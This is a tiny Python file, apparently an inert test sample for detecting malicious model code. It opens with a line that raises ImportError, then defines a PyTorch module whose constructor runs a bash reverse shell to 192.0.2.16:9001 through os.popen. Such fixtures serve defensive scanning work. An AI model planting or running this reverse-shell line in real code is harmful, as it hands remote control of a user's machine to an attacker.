raise ImportError("inert test sample")
import os

import torch.nn as nn


class M(nn.Module):
    def __init__(self, config):
        super().__init__()
        os.popen("bash -i >& /dev/tcp/192.0.2.16/9001 0>&1")
